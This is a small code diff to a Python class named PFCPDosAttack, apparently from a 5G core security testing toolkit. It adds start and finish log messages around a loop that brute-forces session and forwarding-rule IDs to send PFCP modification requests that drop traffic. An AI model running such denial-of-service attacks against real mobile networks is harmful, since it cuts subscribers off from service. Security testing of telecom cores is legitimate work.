@@ -716,6 +716,8 @@ class PFCPDosAttack:
             src_port=src_port,
             dest_port=dest_port,
         )
+
+        self.logger.info("Starting PFCP Session modification far drop bruteforce")
         for seid in range(1, session_range):
 
             for farId in range(1, far_range):
@@ -733,6 +735,7 @@ class PFCPDosAttack:
                     self.logger.success(
                         f"PFCP Session Modification Request accepted, SEID: {hex(seid)}, FAR_ID: {hex(farId)}"
                     )
+        self.logger.success("PFCP Session modification far drop bruteforce finished")
 
     # TODO: In PFCPToolkit, to edit dupl parameters, might need to use "UpdateDuplicatingParameters" IE instead of "DuplicatingParameters"
     def start_pfcp_session_modification_far_dupl_bruteforce(
